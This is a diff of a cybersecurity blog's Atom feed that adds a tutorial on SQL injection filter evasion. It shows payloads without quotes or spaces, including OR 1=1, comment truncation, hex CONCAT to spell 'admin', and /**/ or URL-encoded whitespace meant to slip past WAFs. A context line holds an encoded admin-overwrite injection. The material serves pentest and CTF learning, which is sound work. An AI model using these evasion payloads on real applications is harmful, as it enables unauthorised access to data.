@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-08T20:30:58-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-09T13:29:34-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
 
@@ -2387,7 +2387,260 @@ hacked_admin%27%20wHeRe%20username%3D%27admin%27%20--%20
 
 <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ucmZkwMBVUmrgTbY1gXtA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
 
-<p>This stealthy version avoids direct detection by the filter but still executes as intended after decoding by the database.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<p>This stealthy version avoids direct detection by the filter but still executes as intended after decoding by the database.</p>
+
+<h2 id="no-quote-sql-injection-attacking-without-quotes">No-Quote SQL Injection: Attacking Without Quotes</h2>
+
+<p>Sometimes when you’re probing a web app for SQL injection (SQLi) vulnerabilities, you’ll run into a filter that strips or escapes quotes (<code class="language-plaintext highlighter-rouge">'</code> or <code class="language-plaintext highlighter-rouge">"</code>). Normally, these quotes are essential in crafting payloads especially when targeting string-based SQL queries.</p>
+
+<p>But here’s the twist: <strong>quotes aren’t always necessary</strong>. There are stealthier methods to slip your payload through. We call this <strong>No-Quote SQL Injection</strong>. Let’s break it down.</p>
+
+<hr />
+
+<h3 id="1-numerical-injection-pure-logic-based-payloads">1. Numerical Injection (Pure Logic-Based Payloads)</h3>
+
+<p>If the backend is working with numeric data types (like <code class="language-plaintext highlighter-rouge">user_id</code>, <code class="language-plaintext highlighter-rouge">price</code>, or anything not enclosed in quotes), you can craft injections that don’t use quotes at all.</p>
+
+<p><strong>Example:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+?id=1 OR 1=1
+</code></pre>
+</div>
+
+<p>No quotes. No strings. Just logic. If the original query looks like:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM users WHERE id = 1;
+</code></pre>
+</div>
+
+<p>your injection turns it into:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM users WHERE id = 1 OR 1=1;
+</code></pre>
+</div>
+
+<p><strong>bypass achieved</strong>. The <code class="language-plaintext highlighter-rouge">OR 1=1</code> clause is always true, so it dumps all records.</p>
+
+<hr />
+
+<p>###2. SQL Comments to Kill the Query</p>
+
+<p>SQL comments (<code class="language-plaintext highlighter-rouge">--</code>, <code class="language-plaintext highlighter-rouge">#</code>, or <code class="language-plaintext highlighter-rouge">/* */</code>) are used to nullify the rest of the original query after your payload. This is super useful if you’re dealing with leftover query logic that could break your injection.</p>
+
+<p><strong>Example:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+?id=1--
+</code></pre>
+</div>
+
+<p>Imagine the original backend query is:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM users WHERE id = 1 AND active = 1;
+</code></pre>
+</div>
+
+<p>With the injection:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM users WHERE id = 1-- AND active = 1;
+</code></pre>
+</div>
+
+<p>Everything after <code class="language-plaintext highlighter-rouge">--</code> is ignored. You just chopped off the rest of the query. Mission complete.</p>
+
+<hr />
+
+<h3 id="3-string-building-without-quotes--using-concat">3. String Building Without Quotes – Using <code class="language-plaintext highlighter-rouge">CONCAT()</code></h3>
+
+<p>What if you need to inject strings (like usernames), but quotes are blocked? Enter: <strong>hex values + CONCAT()</strong>.</p>
+
+<p><strong>Example:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
+</code></pre>
+</div>
+
+<p>This builds the string <code class="language-plaintext highlighter-rouge">"admin"</code> using hex ASCII values.</p>
+
+<p>Why it works:</p>
+
+<ul>
+  <li>
+    <p>Bypasses quote filters.</p>
+  </li>
+  <li>
+    <p>Looks like a function call to the DB.</p>
+  </li>
+  <li>
+    <p>Flies under many WAFs.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="no-spaces-allowed-no-problem">No-Spaces Allowed? No Problem</h2>
+
+<p>Now, let’s say the target also filters out <strong>spaces</strong>. That’s another layer of defense but it’s just an obstacle, not a dead end.</p>
+
+<hr />
+
+<h3 id="1-replace-spaces-with-comments">1. Replace Spaces with Comments</h3>
+
+<p>SQL allows multi-line comments using <code class="language-plaintext highlighter-rouge">/**/</code>. You can use these to replace spaces in your payload.</p>
+
+<p><strong>Example:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT/**/name/**/FROM/**/users
+</code></pre>
+</div>
+
+<p>This still executes as:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT name FROM users
+</code></pre>
+</div>
+
+<p>It’s fully functional and filters that look for the word <code class="language-plaintext highlighter-rouge">SELECT</code> followed by a space won’t catch it.</p>
+
+<hr />
+
+<h3 id="2-tab-t-and-newline-n-injection">2. Tab (<code class="language-plaintext highlighter-rouge">\t</code>) and Newline (<code class="language-plaintext highlighter-rouge">\n</code>) Injection</h3>
+
+<p>Filters may block ASCII space (0x20), but not other whitespace. Try:</p>
+
+<ul>
+  <li>
+    <p>Tab: <code class="language-plaintext highlighter-rouge">\t</code> or <code class="language-plaintext highlighter-rouge">%09</code></p>
+  </li>
+  <li>
+    <p>Newline: <code class="language-plaintext highlighter-rouge">\n</code> or <code class="language-plaintext highlighter-rouge">%0A</code></p>
+  </li>
+</ul>
+
+<p><strong>Example:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT%09name%0AFROM%09users
+</code></pre>
+</div>
+
+<p>Some backends will normalize these characters, giving you the same result as using spaces.</p>
+
+<hr />
+
+<h3 id="3-url-encoded-whitespace-payloads">3. URL-Encoded Whitespace Payloads</h3>
+
+<p>Other lesser-known whitespace characters:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">%0C</code> (form feed)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">%0D</code> (carriage return)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">%A0</code> (non-breaking space)</p>
+  </li>
+</ul>
+
+<p>These can be strategically dropped into a URL-encoded injection payload to sneak past naïve filters.</p>
+
+<hr />
+
+<h2 id="note">Note</h2>
+
+<p>When dealing with heavy filtering, <strong>understand how the server parses input</strong>. The goal is to craft a syntactically valid query while avoiding the exact patterns WAFs are trained to detect.</p>
+
+<p>No-quote and no-space payloads are all about <strong>adaptive syntax evasion</strong>. Think like a compiler. Feed it what it accepts, not what looks normal.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><strong>What is Active Directory?</strong>
 Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>
